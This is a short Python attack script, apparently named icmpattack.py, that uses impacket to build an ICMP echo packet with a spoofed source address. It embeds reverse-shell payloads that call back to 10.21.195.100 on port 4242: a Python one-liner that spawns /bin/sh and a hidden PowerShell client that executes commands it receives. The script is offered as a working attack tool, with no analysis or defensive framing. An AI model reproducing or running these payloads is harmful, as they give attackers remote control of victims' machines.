from impacket import ImpactDecoder
from impacket import ImpactPacket
import socket
import sys

#---------------------------------------#
#---Syntax check---#
if len(sys.argv) < 3:
    print("Syntax: python icmpattack.py <Source IP> <Destination IP")
    sys.exit(1)

host = sys.argv[1]
vic = sys.argv[2]

#----------------------------------------#
#---IP Packet Initialization---#
IP = ImpactPacket.IP()
IP.set_ip_dst(vic)
IP.set_ip_src(host)

#---ICMP Initialization---#
ICMP = ImpactPacket.ICMP()
ICMP.set_icmp_type(ICMP.ICMP_ECHO)

#---Payload Definition---#
pl_lin = "python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.21.195.100\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'"

pl_win = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.21.195.100\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#---Payload Byte Formatting--#
PL_DATA =  pl_lin.encode()
ICMP.contains(ImpactPacket.Data(PL_DATA))
IP.contains(ICMP)

print(IP)





